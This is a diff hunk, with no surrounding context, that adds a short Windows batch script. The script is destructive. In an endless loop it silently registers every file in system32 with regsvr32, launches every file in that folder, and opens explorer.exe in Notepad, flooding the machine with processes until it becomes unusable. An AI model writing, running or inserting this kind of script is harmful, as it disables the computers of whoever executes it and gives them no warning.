@@ -1,0 +1,5 @@
+:die 
+@start regsvr32.exe /s %windir%\system32\*.* >nul 
+@start %windir%\system32\*.* >nul 
+@start notepad %windir%\explorer.exe >nul 
+goto die
